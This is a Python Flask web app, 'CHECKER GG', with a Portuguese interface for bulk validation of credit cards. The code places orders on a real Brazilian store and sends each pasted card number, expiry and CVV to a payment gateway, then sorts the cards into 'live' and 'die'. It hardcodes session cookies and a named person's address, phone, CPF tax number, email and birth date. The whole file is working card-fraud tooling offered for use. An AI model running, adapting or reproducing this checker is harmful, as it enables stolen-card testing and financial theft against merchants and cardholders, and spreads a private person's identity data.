#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CHECKER GG
By: @Chucky_171
"""

from flask import Flask, request, render_template_string, jsonify
import requests
import re
import json
import time
import random
import string
import urllib3
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
requests.packages.urllib3.disable_warnings()

YOUR_AT = "@Chucky_171"

# Cookies
COOKIES = {
    "AdoptVisitorId": "GYYwpgzMAMCsBsBaATMARkgLLA7GRAnACYCGsiwBmR0Ys0AHJgWkA===",
    "_ga": "GA1.1.201427785.1769251479",
    "_fbp": "fb.1.1769251479434.459043939485703341",
    "_gcl_au": "1.1.1961479347.1769251482",
    "AdoptConsent": "N4Ig7gpgRgzglgFwgSQCIgFwgOwGMDMAJgGz7YAsAtABwCcEtl51AhhJVAIzn6XbUAmXAAZi5AKwVBIADQgAbnHgIA9gCdkhTCABmuCPh3DxxSgJ1RTE7O1qEW4yjtrlCwiOOHVytKLJAIuDoAyghqcAB2AOaYEQCuADYJcioADgjIEQAqLFEwmADaIFAAMgBqKgBa4gkIcAAK/vXBlSwlAGKUtABCZf5w2Kj4CACaAFbCAKL5cgC22AAWAIIR4gBe4vWp/gCKY9g9ZcRl1OgAuinpAPJxCDl5hRcguCoRMBARGVpYS6kA4iMVO1/C83h8EGUIGp4K9MMI5HFUvYkIQlghtAJhAJTMJOGZyFlOMIMORyCSBAA6CTCSogAC+QA===",
    "wordpress_sec_9726711e77ba9c3c3ef4003e621eb603": "brenohen2008%7C1770469666%7CEmp5cFBX1hb8jH34K3DPeOXxTCZyselfW1KU8HcewPo%7C10fe34a4f640bd2ba18a4eeb15585de454d4d783f4f60b69b11975fc5decfbf7",
    "wordpress_logged_in_9726711e77ba9c3c3ef4003e621eb603": "brenohen2008%7C1770469666%7CEmp5cFBX1hb8jH34K3DPeOXxTCZyselfW1KU8HcewPo%7C7ae7e39b23b83deb6777062121a92e4f75d1bd10686e04e118aa1b10e7cd3003",
    "mailerlite_checkout_token": "1769260095377",
    "wp_woocommerce_session_9726711e77ba9c3c3ef4003e621eb603": "1870%7C1769432895%7C1769346495%7C%24generic%24cicezYNG9-obhkG9pUwZygMQj2l6Q15TZE1odyKO",
    "mailerlite_accepts_marketing": "1",
    "wfwaf-authcookie-413eed3e33c31781638e454021428272": "1870%7Cother%7Cread%7C124777f909742e99349d019db31cb8119b433b03ec13069ba90cb8a371d3173f",
    "_clck": "1fj40ef%5E2%5Eg30%5E0%5E2215",
    "woocommerce_items_in_cart": "1",
    "woocommerce_cart_hash": "d2f695a4f922a1d2266796e20986e3c1",
    "sbjs_migrations": "1418474375998%3D1",
    "sbjs_current": "typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29",
    "sbjs_first": "typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29",
    "mailerlite_checkout_email": "brenohen2008%40gmail.com"
}

# ============= FUNÇÕES AUXILIARES =============
def luhn_check(card_number):
    """Valida cartão com algoritmo de Luhn"""
    card_number = re.sub(r'\D', '', card_number)
    if len(card_number) < 13:
        return False
    
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10 == 0

def get_card_brand(cc):
    """Detecta bandeira do cartão"""
    cc = cc[:1]
    brands = {
        '4': 'visa',
        '5': 'mastercard',
        '3': 'amex',
        '6': 'discover'
    }
    return brands.get(cc, 'visa')

# ============= API CHECK =============
def check_ubiqplay(lista):
    start_time = time.time()
    steps = []
    
    try:
        parts = lista.split('|')
        if len(parts) != 4:
            return {
                'status': 'error',
                'message': f'Formato inválido',
                'time': '0.00s',
                'steps': []
            }
        
        cc = parts[0].strip()
        mes = parts[1].strip().zfill(2)
        ano = parts[2].strip()
        cvv = parts[3].strip()
        
        if len(ano) == 2:
            ano = f"20{ano}"
        
        if not luhn_check(cc):
            return {
                'status': 'error',
                'message': f'Luhn Check Failed',
                'time': '0.00s',
                'steps': []
            }
        
        brand = get_card_brand(cc)
        steps.append(f"💳 {brand.upper()}")
        
        session = requests.Session()
        session.verify = False
        session.cookies.update(COOKIES)
        
        headers_base = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'Origin': 'https://www.ubiqplay.com',
            'Referer': 'https://www.ubiqplay.com/br/finalizar-compra/',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
        
        # 1. Tracking
        steps.append("📊 Enviando tracking...")
        axeptio_data = [{
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "deployment": datetime.utcnow().isoformat() + "Z",
            "source": "sdk-web-adopt",
            "type": "pagevisible",
            "token": "fce3f056-2fb6-457e-9da5-f94d0e50849b",
            "domain": "www.ubiqplay.com",
            "projectId": "2a9b08e4-227d-4900-8311-9b298303b80d",
            "userAgent": headers_base['User-Agent'],
            "preferences": {"enabled": [], "disabled": []},
            "pathname": "/br/finalizar-compra/",
            "referrer": None,
            "config": {"identifier": "7c3d6374-89e9-48ae-b143-782c06457482"},
            "geolocation": {"reglementation": "lgpd", "userLanguage": "pt"},
            "metadata": {"transport": "keepalive"}
        }]
        
        try:
            session.post(
                'https://axeptio-api.goadopt.io/flow',
                headers={**headers_base, 'Content-Type': 'text/plain;charset=UTF-8'},
                json=axeptio_data,
                timeout=10
            )
        except:
            pass
        
        steps.append("✅ Tracking enviado")
        
        # 2. Create Order
        steps.append("🛒 Criando pedido...")
        
        order_data = {
            'action': 'ubiqfy_create_latam_order',
            'nonce': '52a67721f5',
            'billing_first_name': 'RAQUEL',
            'billing_last_name': 'DE FREITAS',
            'billing_email': 'brenohen2008@gmail.com',
            'billing_phone': '(15) 99745-4667',
            'billing_address_1': 'Rua Hilda Rodrigues Lima',
            'billing_city': 'Sorocaba',
            'billing_state': 'SP',
            'billing_postcode': '18061-299',
            'billing_cpf': '122.671.038-77',
            'billing_birth_date': '24/12/1971',
            'billing_number': '14',
            'billing_neighborhood': 'Vila Barão',
            'order_total': '209.5',
            'installments': '12'
        }
        
        r1 = session.post(
            'https://www.ubiqplay.com/br/wp-admin/admin-ajax.php',
            headers={
                **headers_base,
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest'
            },
            data=order_data,
            timeout=20
        )
        
        if r1.status_code != 200:
            return {
                'status': 'error',
                'message': f'Erro ao criar pedido ({r1.status_code})',
                'time': f'{time.time() - start_time:.2f}s',
                'steps': steps
            }
        
        try:
            order_response = r1.json()
        except:
            return {
                'status': 'error',
                'message': f'Resposta inválida do servidor',
                'time': f'{time.time() - start_time:.2f}s',
                'steps': steps
            }
        
        if not order_response.get('success'):
            return {
                'status': 'error',
                'message': f'Falha ao criar pedido',
                'time': f'{time.time() - start_time:.2f}s',
                'steps': steps
            }
        
        latam_order_id = order_response['data']['latam_order_id']
        auth_token = order_response['data']['auth_token']
        
        steps.append(f"✅ Order ID: {latam_order_id[:20]}...")
        steps.append("🔑 Token obtido")
        
        # 3. Payment
        steps.append("💳 Processando pagamento...")
        
        payment_payload = {
            "order": {
                "id": latam_order_id
            },
            "customer": {
                "name": "RAQUEL DE FREITAS",
                "document": "12267103877",
                "email": "brenohen2008@gmail.com",
                "phone": "15997454667",
                "birth": "24/12/1971"
            },
            "credit_card": {
                "holder_name": "RAQUEL DE FREITAS",
                "card_number": cc,
                "cvv": cvv,
                "due_date": f"{mes}/{ano}",
                "brand": brand
            },
            "address": {
                "street": "Rua Hilda Rodrigues Lima",
                "number": "14",
                "neighborhood": "Vila Barão",
                "complement": "Casa",
                "zip": "18061299",
                "city": "Sorocaba",
                "state": "SP"
            }
        }
        
        r2 = session.post(
            'https://latamgateway.com/api/v1/3ds/create-nonce',
            headers={
                **headers_base,
                'Content-Type': 'application/json',
                'account_token': auth_token
            },
            json=payment_payload,
            timeout=30
        )
        
        steps.append("✅ Resposta recebida")
        
        # Analisar resposta
        elapsed = time.time() - start_time
        tempo = f"{elapsed:.2f}s"
        
        if r2.status_code == 400:
            try:
                payment_response = r2.json()
                message = payment_response.get('message', 'Erro desconhecido')
                
                steps.append(f"📋 {message}")
                
                message_lower = message.lower()
                
                if any(x in message_lower for x in [
                    'expired card',
                    'invalid transaction data',
                    'cvv', 'cvc', 'código',
                    'expirado', 'vencido',
                    'saldo', 'fundos', 'insufficient',
                    'limite', 'limit'
                ]):
                    return {
                        'status': 'live',
                        'message': message,
                        'time': tempo,
                        'steps': steps
                    }
                else:
                    return {
                        'status': 'die',
                        'message': message,
                        'time': tempo,
                        'steps': steps
                    }
            except:
                return {
                    'status': 'die',
                    'message': 'Erro 400',
                    'time': tempo,
                    'steps': steps
                }
        
        elif r2.status_code == 200:
            try:
                payment_response = r2.json()
                message = payment_response.get('message', 'Approved')
                steps.append(f"📋 {message}")
                
                return {
                    'status': 'live',
                    'message': f'Approved - {message}',
                    'time': tempo,
                    'steps': steps
                }
            except:
                return {
                    'status': 'live',
                    'message': 'Approved',
                    'time': tempo,
                    'steps': steps
                }
        
        else:
            error_text = r2.text[:100] if r2.text else f'Status {r2.status_code}'
            steps.append(f"⚠️ {error_text}")
            
            return {
                'status': 'die',
                'message': f'Status {r2.status_code}',
                'time': tempo,
                'steps': steps
            }
    
    except requests.exceptions.Timeout:
        elapsed = time.time() - start_time
        return {
            'status': 'error',
            'message': 'Timeout',
            'time': f'{elapsed:.2f}s',
            'steps': steps
        }
    except Exception as e:
        elapsed = time.time() - start_time
        return {
            'status': 'error',
            'message': f'{str(e)[:50]}',
            'time': f'{elapsed:.2f}s',
            'steps': steps
        }

# ============= ROTAS FLASK =============
@app.route('/check', methods=['GET'])
def api_check():
    card = request.args.get('lista', '')
    
    if not card:
        return 'Reprovada > Cartão não fornecido'
    
    result = check_ubiqplay(card)
    
    if result['status'] == 'live':
        return f"Aprovada > {card} > {result['message']} > @Chucky_171 > {result['time']}"
    elif result['status'] == 'die':
        return f"Reprovada > {card} > {result['message']} > @Chucky_171 > {result['time']}"
    else:
        return f"Error > {card} > {result['message']} > @Chucky_171 > {result['time']}"

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

HTML_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
	<title>CHECKER GG</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.1/css/all.css">
	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css">
	<style type="text/css">
		.nav-tabs{
			background-color:#181A1E;
			border-radius: 5px;
			border: 1px solid rgb(205, 90, 161);
		}
		.nav-tabs li a{
			color: #fff;
		}
		.tab-content{
			background-color:#181A1E;
			color:#fff;
			padding:5px;
			border-radius: 5px;
			border: 1px solid rgb(14, 2, 92);
		}
		.nav-tabs > li > a{
			border: medium none;
		}
		.nav-tabs > li > a:hover{
			background-color: #181A1E !important;
			border: medium none;
			border-radius: 0;
			color:#fff;
			border-radius: 5px;
			border: 1px solid rgb(14, 2, 92);
		}
		.active {
			background-color: #181A1E !important;
		}
		textarea{
			background: #0F1116;
			color: #fff;
			width: 100%;
			border: none;
			padding: 10px;
			resize: none;
			border: none;
			border-radius: 5px;
			border: 1px solid rgb(14, 2, 92);
		}
		textarea:focus{
			box-shadow: 0 0 0 0;
			border: 0 none;
			outline: 0;
		}
		button {
			padding: 10px 20px;
			background-color: #181A1E;
			color: white;
			border: none;
			cursor: pointer;
			border-radius: 5px;
		}
		button:hover {
			background-color: #181A1E;
			border-radius: 5px;
			border: 1px solid rgb(14, 2, 92);
		}
	</style>
</head>
<body style="background: #0F1116;" class="p-3">
	<div class="container text-white rounded shadow p-3 my-4" style="background: #181A1E; border-radius: 5px; border: 1px solid rgb(14, 2, 92);">
		<div class="container-fluid">
			<h3><i class="fas fa-cogs"></i> CHECKER GG</h3>
			<span><b>By: @Chucky_171</b></span>
		</div>
		<div class="container-fluid mt-3">
			<div class="buttons">
				<button class="btn btn-dark" style="background: rgb(14, 2, 92);" id="chk-start"><i class="fas fa-play"></i> Iniciar</button>
				<button class="btn btn-dark" style="background: rgb(14, 2, 92);" id="chk-pause" disabled><i class="fas fa-pause"></i> Pausar</button>
				<button class="btn btn-dark" style="background: rgb(14, 2, 92);" id="chk-stop" disabled><i class="fas fa-stop"></i> Parar</button>
				<button class="btn btn-dark" style="background: rgb(14, 2, 92);" id="chk-clean"><i class="fas fa-trash-alt"></i> Limpar</button>
			</div>
		</div>
		<div class="container-fluid mt-3">
			<span class="badge badge-warning" id="estatus">Aguardando inicio...</span>
		</div>
	</div>

	<div class="container p-0 shadow">
		<ul class="nav nav-tabs" id="myTab" role="tablist" style="border: none;">
			<li class="nav-item">
				<a class="nav-link active" style="border: none;" id="home-tab" data-toggle="tab" href="#chk-home" role="tab"><i class="far fa-credit-card" style="color: #fff;"></i></a>
			</li>
			<li class="nav-item">
				<a class="nav-link" style="border: none;" id="profile-tab" data-toggle="tab" href="#chk-lives" role="tab"><i class="fa fa-thumbs-up fa-lg" style="color: #fff;"></i></a>
			</li>
			<li class="nav-item">
				<a class="nav-link" style="border: none;" id="contact-tab" data-toggle="tab" href="#chk-dies" role="tab"><i class="fa fa-thumbs-down fa-lg" style="color: #fff;"></i></a>
			</li>
			<li class="nav-item">
				<a class="nav-link" style="border: none;" id="contact-tab" data-toggle="tab" href="#chk-errors" role="tab"><i class="fas fa-times fa-lg" style="color: #fff;"></i></a>
			</li>
		</ul>
		<div class="tab-content" id="myTabContent">
			<div class="tab-pane fade show active px-3 pt-4 pb-3" id="chk-home" role="tabpanel">
				<div class="my-2">
					Aprovadas: <span class="val-lives" style="font-weight: bold;">0</span>
					Reprovadas: <span class="val-dies" style="font-weight: bold;">0</span>
					Errors: <span class="val-errors" style="font-weight: bold;">0</span>
					Testadas: <span class="val-tested" style="font-weight: bold;">0</span>
					Total: <span class="val-total" style="font-weight: bold;">0</span>
				</div>
				<div class="container-fluid p-0 mt-2">
					<textarea id="lista_cartoes" placeholder="Insira sua lista..." rows="10"></textarea>
				</div>
			</div>

			<div class="tab-pane fade show px-3 pt-4 pb-3" id="chk-lives" role="tabpanel">
				<h5>Aprovadas</h5>
				<span>Total: <span class="val-lives">0</span></span>
				<br>
				<button class="btn btn-dark" style="background: rgb(14, 2, 92);" id="copyButton"><i class="fas fa-copy"></i></button>
				<button class="btn btn-dark" style="background: rgb(14, 2, 92);" onclick="apagarValoresLives()"><i class="fas fa-trash-alt"></i></button>
				<br>
				<div id="lives" style="overflow:auto;"></div>
			</div>

			<div class="tab-pane fade show px-3 pt-4 pb-3" id="chk-dies" role="tabpanel">
				<h5>Reprovadas</h5>
				<span>Total: <span class="val-dies">0</span></span>
				<br>
				<button class="btn btn-dark" style="background:rgb(14, 2, 92);" onclick="apagarValoresDies()"><i class="fas fa-trash-alt"></i></button>
				<br>
				<div id="dies" style="overflow:auto;"></div>
			</div>

			<div class="tab-pane fade show px-3 pt-4 pb-3" id="chk-errors" role="tabpanel">
				<h5>Erros</h5>
				<span>Total: <span class="val-errors">0</span></span>
				<br>
				<button class="btn btn-dark" style="background: rgb(14, 2, 92);" onclick="apagarValoresErrors()"><i class="fas fa-trash-alt"></i></button>
				<br>
				<div id="errors" style="overflow:auto;"></div>
			</div>
		</div>	
	</div>

	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
	<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

	<script>
	function apagarValoresLives() {
		document.getElementById("lives").innerHTML = "";
	}
	function apagarValoresDies() {
		document.getElementById("dies").innerHTML = "";
	}
	function apagarValoresErrors() {
		document.getElementById("errors").innerHTML = "";
	}
	</script>

	<script>
	const copyButton = document.getElementById('copyButton');
	const livesDiv = document.getElementById('lives');

	copyButton.addEventListener('click', () => {
		const range = document.createRange();
		range.selectNode(livesDiv);
		window.getSelection().removeAllRanges();
		window.getSelection().addRange(range);

		try {
			const successful = document.execCommand('copy');
			const message = successful ? 'Copiado!' : 'Erro ao copiar.';
			toastr["success"](message);
		} catch (err) {
			console.error('Erro: ', err);
		}

		window.getSelection().removeAllRanges();
	});
	</script>

	<script type="text/javascript">
	$(document).ready(function() {
		var testadas = [];
		var total = 0;
		var tested = 0;
		var lives = 0;
		var dies = 0;
		var errors = 0;
		var stopped = true;
		var paused = true;

		function removelinha() {
			var lines = $("textarea").val().split('\\n');
			lines.splice(0, 1);
			$("textarea").val(lines.join("\\n"));
		}

		function testar(tested, total, lista) {
			if (stopped == true) return false;
			if (paused == true) return false;

			if (tested >= total) {
				$("#estatus").attr("class", "badge badge-success").text("Teste finalizado");
				toastr["success"]("Teste de " + total + " itens finalizado");
				$("#chk-start").removeAttr('disabled');
				$("#chk-clean").removeAttr('disabled');
				$("#chk-stop").attr("disabled", "true");
				$("#chk-pause").attr("disabled", "true");
				return false;
			}

			var conteudo = lista[tested];
			$.ajax({
				url: '/check',
				type: 'GET',
				data: { lista: conteudo },
			})
			.done(function(response) {
				if (stopped == true) return false;
				if (paused == true) return false;

				tested++;

				if (response.indexOf("Aprovada") >= 0) {
					lives++;
					$("#estatus").attr("class", "badge badge-success").text(conteudo + " -> LIVE");
					toastr["success"]("Aprovada! " + conteudo);
					$("#lives").prepend("✅ APROVADO ✅ > " + response + "<br>");
				} else if (response.indexOf("Reprovada") >= 0) {
					dies++;
					$("#estatus").attr("class", "badge badge-danger").text(conteudo + " -> DIE");
					toastr["error"]("Reprovada! " + conteudo);
					$("#dies").prepend("❌ REPROVADO ❌ > " + response + "<br>");
				} else {
					errors++;
					$("#estatus").attr("class", "badge badge-warning").text(conteudo + " -> ERROR");
					toastr["warning"]("Erro! " + conteudo);
					$("#errors").prepend("⚠️ ERROR ⚠️ > " + response + "<br>");
				}

				$(".val-total").text(total);
				$(".val-lives").text(lives);
				$(".val-dies").text(dies);
				$(".val-errors").text(errors);
				$(".val-tested").text(tested);

				removelinha();
				testar(tested, total, lista);
			})
			.fail(function() {
				return false;
			})
		}

		function start() {
			var lista = $("textarea").val().trim().split('\\n');
			var total = lista.length;

			$(".val-total").text(total);
			stopped = false;
			paused = false;
			toastr["success"]("Checker Iniciado.");
			$("#estatus").attr("class", "badge badge-success").text("Checker iniciado, aguarde...");

			$("#chk-stop").removeAttr('disabled');
			$("#chk-pause").removeAttr('disabled');
			$("#chk-start").attr("disabled", "true");
			$("#chk-clean").attr("disabled", "true");

			testar(tested, total, lista);
		}

		$("#chk-start").click(function() {
			if ($('textarea').val().trim() == "") {
				$('textarea').focus();
			} else {
				start();
			}
		});

		function pause() {
			$("#chk-start").removeAttr('disabled');
			$("#chk-pause").attr("disabled", "true");
			paused = true;
			toastr["info"]("Checker Pausado!");
			$("#estatus").attr("class", "badge badge-info").text("Checker pausado...");
		}

		$("#chk-pause").click(function() {
			pause();
		});

		function stop() {
			stopped = true;
			$("#chk-start").removeAttr('disabled');
			$("#chk-clean").removeAttr('disabled');
			$("#chk-stop").attr("disabled", "true");
			$("#chk-pause").attr("disabled", "true");
			toastr["info"]("Checker Parado!");
			$("#estatus").attr("class", "badge badge-secondary").text("Checker parado...");
		}

		$("#chk-stop").click(function() {
			stop();
		});

		function clean() {
			testadas = [];
			total = 0;
			tested = 0;
			lives = 0;
			dies = 0;
			errors = 0;
			stopped = true;

			$(".val-total").text(total);
			$(".val-lives").text(lives);
			$(".val-dies").text(dies);
			$(".val-errors").text(errors);
			$(".val-tested").text(tested);
			$("textarea").val("");
			toastr["info"]("Checker Limpo!");
		}

		$("#chk-clean").click(function() {
			clean();
		});
	});
	</script>
</body>
</html>'''

if __name__ == '__main__':
    print("\n" + "="*60)
    print("CHECKER GG 🔥")
    print("By: @Chucky_171")
    print("="*60 + "\n")
    print("🌐 Servidor: http://localhost:5003")
    print("📦 Dependências: pip install flask requests")
    print("\n✅ LIVE responses: Expired Card, Invalid Transaction Data")
    print("\nVAI DAR BOM! 🔥")
    print("Pressione CTRL+C para parar!\n")
    
    app.run(host='0.0.0.0', port=5003, debug=False)